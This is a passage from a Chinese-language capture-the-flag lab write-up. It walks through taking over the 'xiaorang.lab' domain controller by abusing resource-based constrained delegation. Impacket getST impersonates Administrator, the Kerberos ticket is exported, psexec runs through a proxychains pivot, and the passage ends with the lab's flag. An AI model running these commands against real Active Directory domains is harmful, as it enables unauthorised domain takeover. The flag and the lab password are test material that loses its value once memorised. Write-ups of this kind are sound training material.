Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  117.72.148.131:6666  ...  172.22.9.7:636  ...  OK
[*] Accounts allowed to act on behalf of other identity:
[-] SID not found in LDAP: S-1-5-21-990187620-235975882-534697781-1212
[*]     [Could not resolve SID]   (S-1-5-21-990187620-235975882-534697781-1212)
[*] Delegation rights modified successfully!
[*] test2$ can now impersonate users on XIAORANG-DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[-] SID not found in LDAP: S-1-5-21-990187620-235975882-534697781-1212
[*]     [Could not resolve SID]   (S-1-5-21-990187620-235975882-534697781-1212)
[*]     test2$       (S-1-5-21-990187620-235975882-534697781-1214)
```

相同的操作。

```bash
proxychains4 impacket-getST -dc-ip 172.22.9.7 -spn cifs/XIAORANG-DC.xiaorang.lab 'xiaorang.lab/test2$:qwe123!@#' -impersonate Administrator
```

导入票据。

```bash
export KRB5CCNAME=Administrator@cifs_XIAORANG-DC.xiaorang.lab@XIAORANG.LAB.ccache
```

我们再去登录 DC 即可。

```bash
proxychains4 impacket-psexec -k -no-pass Administrator@XIAORANG-DC.xiaorang.lab -dc-ip 172.22.9.7 -codec gbk
```

最后，我们拿到 flag 4。

```plaintext
  ______                 _  ___
 / _____)           _   (_)/ __)
| /      ____  ____| |_  _| |__ _   _
| |     / _  )/ ___)  _)| |  __) | | |
| \____( (/ /| |   | |__| | |  | |_| |
 \______)____)_|    \___)_|_|   \__  |
                               (____/

flag04: flag{54ef93cd-8b52-43f8-a320-f555718e7a1b}
```

